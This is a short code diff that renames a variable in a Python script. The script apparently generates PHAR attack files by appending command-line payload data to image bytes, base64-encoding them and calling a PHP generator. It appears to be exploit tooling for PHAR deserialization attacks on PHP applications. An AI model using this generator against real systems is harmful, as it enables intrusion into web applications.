@@ -20,8 +20,8 @@ payload_data = sys.argv[1].encode()
 
 phar_payload = base64.b64encode(picture_data + payload_data).decode()
 
-bashCommand = "php phar_generator.php " + phar_payload
-process = subprocess.Popen(bashCommand.split(), stdout=subprocess.PIPE)
+bash_command = "php phar_generator.php " + phar_payload
+process = subprocess.Popen(bash_command.split(), stdout=subprocess.PIPE)
 output, error = process.communicate()
 if output != b'[+] File created\n':
     print('[-] An error occured while creating the file')
